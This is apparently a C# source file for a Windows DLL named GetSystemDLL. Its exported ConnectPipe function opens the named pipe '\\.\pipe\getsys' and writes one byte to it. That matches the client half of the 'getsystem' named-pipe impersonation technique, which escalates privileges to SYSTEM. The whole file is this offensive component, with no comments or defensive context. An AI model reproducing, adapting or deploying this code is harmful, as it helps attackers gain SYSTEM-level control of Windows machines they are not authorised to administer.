using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.IO;

namespace GetSystemDLL
{

    public class PipeDLL
    {

         [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         public static extern IntPtr CreateFile(
            string filename,
            int access,
            int share,
            IntPtr securityAttributes,
            int creationDisposition,
            int flagsAndAttributes,
            IntPtr templateFile);

        [DllImport("kernel32.dll")]
        public static extern bool WriteFile(
            IntPtr hFile, 
            byte[] lpBuffer,
            uint nNumberOfBytesToWrite,
            out uint lpNumberOfBytesWritten,
            IntPtr lpOverlapped);


        [DllExport]
        public static void ConnectPipe()
        {

            string pipeName = "\\\\.\\pipe\\getsys";
            IntPtr hPipe = CreateFile(pipeName, 0x10000000, 0, IntPtr.Zero, 3, 0x80, IntPtr.Zero);

            byte[] data = new byte[1];
            data[0] = 0;
            uint bytesWritten;
            WriteFile(hPipe, data, 1, out bytesWritten, IntPtr.Zero);

        }

    }
}
